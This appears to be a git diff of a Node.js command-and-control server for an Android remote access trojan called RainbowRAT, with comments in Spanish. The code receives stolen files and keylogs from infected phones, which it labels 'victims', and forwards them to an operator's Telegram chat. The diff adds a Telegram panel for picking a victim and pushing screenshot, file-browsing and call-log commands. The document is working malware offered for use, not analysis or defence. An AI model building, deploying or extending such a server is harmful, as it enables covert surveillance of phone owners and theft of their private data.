@@ -6,105 +6,150 @@ const multer = require('multer');
 const fs = require('fs');
 
 /**
- * SERVIDOR C2 RAINBOW - VERSIÓN DE DEPURACIÓN (DEBUG)
- * Diseñado para capturar conexiones ofuscadas y parámetros de consulta.
+ * SERVIDOR C2 RAINBOW - VERSIÓN DE EJECUCIÓN FORZADA
+ * Basado en la detección exitosa del dispositivo Xiaomi.
  */
 
 let config = { token: "", id: "" };
 try {
     config = JSON.parse(fs.readFileSync('./data.json', 'utf8'));
 } catch (e) {
-    console.error("❌ Error: data.json no encontrado.");
+    console.error("❌ Error: Configura data.json");
     process.exit(1);
 }
 
 const app = express();
 const server = http.createServer(app);
-
-// Configuración de Socket.io optimizada para clientes Android antiguos/ofuscados
 const io = new Server(server, {
     cors: { origin: "*" },
-    allowEIO3: true, // Crucial para la versión de Socket.io en el APK
-    transports: ['websocket', 'polling'] // Permitir ambos métodos de transporte
+    allowEIO3: true,
+    transports: ['websocket', 'polling']
 });
 
 const bot = new TelegramBot(config.token, { polling: true });
 const victims = new Map();
+const userState = new Map();
 
 app.use(express.json());
 
-// Log de cada petición HTTP para ver si el APK intenta conectar vía POST/GET
+// Logs para debugging en Railway
 app.use((req, res, next) => {
-    console.log(`[HTTP] ${req.method} ${req.url} - IP: ${req.ip}`);
+    console.log(`[${new Date().toLocaleTimeString()}] ${req.method} ${req.url}`);
     next();
 });
 
-// Endpoints HTTP (Upload y Text)
+// Recepción de archivos
 const upload = multer({ storage: multer.memoryStorage() });
 app.post('/upload', upload.single('file'), (req, res) => {
     const devId = req.headers['currenttarget'] || "Desconocido";
     if (req.file) {
         bot.sendDocument(config.id, req.file.buffer, {
-            caption: `<b>📁 Archivo de:</b> <code>${devId}</code>`,
+            caption: `<b>📦 Archivo de: ${devId}</b>`,
             parse_mode: 'HTML'
         }, { filename: req.file.originalname });
     }
     res.send('ok');
 });
 
+// Recepción de textos/logs
 app.post('/text', (req, res) => {
     const devId = req.headers['currenttarget'] || "Desconocido";
-    const text = req.body.text || JSON.stringify(req.body);
-    bot.sendMessage(config.id, `<b>⌨️ Keylog [${devId}]:</b>\n<code>${text}</code>`, { parse_mode: 'HTML' });
+    const content = req.body.text || JSON.stringify(req.body);
+    bot.sendMessage(config.id, `<b>📝 Log [${devId}]:</b>\n<code>${content}</code>`, { parse_mode: 'HTML' });
     res.send('ok');
 });
 
-// --- GESTIÓN DE SOCKETS CON DEPURACIÓN ---
+// --- COMUNICACIÓN POR SOCKET ---
 
 io.on('connection', (socket) => {
-    // IMPORTANTE: El APK puede enviar los datos en la URL (query) o en Headers
-    const query = socket.handshake.query;
-    const headers = socket.handshake.headers;
+    const h = socket.handshake.headers;
+    const q = socket.handshake.query;
     
-    console.log("[SOCKET] Intento de conexión detectado");
-    console.log("-> Query Params:", JSON.stringify(query));
-    console.log("-> Headers:", JSON.stringify(headers));
-
-    // Intentamos obtener el ID del dispositivo de múltiples fuentes
-    const deviceId = query.currenttarget || headers['currenttarget'] || query.model || headers['model'] || socket.id;
-    const model = query.model || headers['model'] || "Android Device";
+    // Identificación según b.smali
+    const deviceId = h['currenttarget'] || q['currenttarget'] || socket.id;
+    const model = h['model'] || q['model'] || "Android";
 
     victims.set(deviceId, socket.id);
-    
-    console.log(`[+] Víctima Identificada: ${model} (${deviceId})`);
+    console.log(`[+] Dispositivo conectado: ${deviceId}`);
 
-    bot.sendMessage(config.id, `<b>✅ Dispositivo Online</b>\nModelo: ${model}\nID: <code>${deviceId}</code>\nIP: ${socket.handshake.address}`, { parse_mode: 'HTML' });
+    bot.sendMessage(config.id, `<b>✅ Dispositivo Online</b>\nModelo: ${model}\nID: <code>${deviceId}</code>`, { 
+        parse_mode: 'HTML' 
+    });
 
     socket.on('ping', () => socket.emit('pong'));
 
     socket.on('data', (data) => {
-        console.log(`[DATA] de ${deviceId}:`, data);
-        const report = typeof data === 'object' ? JSON.stringify(data, null, 2) : data;
-        bot.sendMessage(config.id, `<b>📨 Respuesta:</b>\n<pre>${report}</pre>`, { parse_mode: 'HTML' });
+        console.log(`[RECEP] Datos de ${deviceId}:`, data);
+        let msg = typeof data === 'object' ? JSON.stringify(data, null, 2) : data;
+        bot.sendMessage(config.id, `<b>📩 Respuesta:</b>\n<pre>${msg}</pre>`, { parse_mode: 'HTML' });
     });
 
-    socket.on('disconnect', (reason) => {
-        console.log(`[-] Desconectado: ${deviceId} (Razón: ${reason})`);
+    socket.on('disconnect', () => {
+        console.log(`[-] Dispositivo desconectado: ${deviceId}`);
         victims.delete(deviceId);
         bot.sendMessage(config.id, `<b>❌ Dispositivo Offline</b>\nID: ${deviceId}`);
     });
+});
 
-    // Capturar cualquier evento no definido para ver si el APK usa otros nombres
-    socket.onAny((eventName, ...args) => {
-        if (eventName !== 'ping' && eventName !== 'data') {
-            console.log(`[EVENTO DESCONOCIDO] ${eventName}:`, args);
-            bot.sendMessage(config.id, `<b>🔔 Evento detectado:</b> <code>${eventName}</code>\nPayload: <pre>${JSON.stringify(args)}</pre>`, { parse_mode: 'HTML' });
+// --- INTERFAZ TELEGRAM ---
+
+bot.on('message', (msg) => {
+    const chatId = msg.chat.id;
+    if (String(chatId) !== String(config.id)) return;
+    const text = msg.text;
+
+    if (text === '/start' || text === '↩️ Volver') {
+        userState.delete(chatId);
+        return bot.sendMessage(chatId, "<b>✯ Rainbow C2 Panel ✯</b>", {
+            parse_mode: 'HTML',
+            reply_markup: {
+                keyboard: [['📱 Lista de Víctimas']],
+                resize_keyboard: true
+            }
+        });
+    }
+
+    if (text === '📱 Lista de Víctimas') {
+        const ids = Array.from(victims.keys());
+        if (ids.length === 0) return bot.sendMessage(chatId, "No hay conexiones.");
+        const kb = ids.map(id => [id]);
+        kb.push(['↩️ Volver']);
+        return bot.sendMessage(chatId, "Selecciona dispositivo:", { reply_markup: { keyboard: kb, resize_keyboard: true } });
+    }
+
+    if (victims.has(text)) {
+        userState.set(chatId, { target: text });
+        const actions = [['📸 Foto', '📂 Archivos'], ['📞 Llamadas', '↩️ Volver']];
+        return bot.sendMessage(chatId, `📍 Controlando: ${text}`, { reply_markup: { keyboard: actions, resize_keyboard: true } });
+    }
+
+    const state = userState.get(chatId);
+    if (state && state.target) {
+        let cmd = null;
+        switch(text) {
+            case '📸 Foto': cmd = 'screenshot'; break;
+            case '📂 Archivos': cmd = 'file-explorer'; break;
+            case '📞 Llamadas': cmd = 'calls'; break;
         }
-    });
+
+        if (cmd) {
+            const sId = victims.get(state.target);
+            if (sId) {
+                // ENVÍO DE TRIPLE FORMATO:
+                // 1. Como objeto con 'action'
+                // 2. Como objeto con 'type'
+                // 3. Como String plano (algunas versiones de Rainbow lo prefieren)
+                
+                const payload = { action: cmd, type: cmd, command: cmd };
+                
+                io.to(sId).emit('data', payload);
+                io.to(sId).emit('data', cmd); // Envío como string plano por si acaso
+                
+                bot.sendMessage(chatId, `⚡ Comando <b>${cmd}</b> enviado en múltiples formatos.`, { parse_mode: 'HTML' });
+            }
+        }
+    }
 });
 
 const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => {
-    console.log(`🚀 C2 escuchando en puerto ${PORT}`);
-    console.log(`Servidor listo para recibir conexiones de RainbowRAT`);
-});
+server.listen(PORT, () => console.log(`Servidor activo en puerto ${PORT}`));
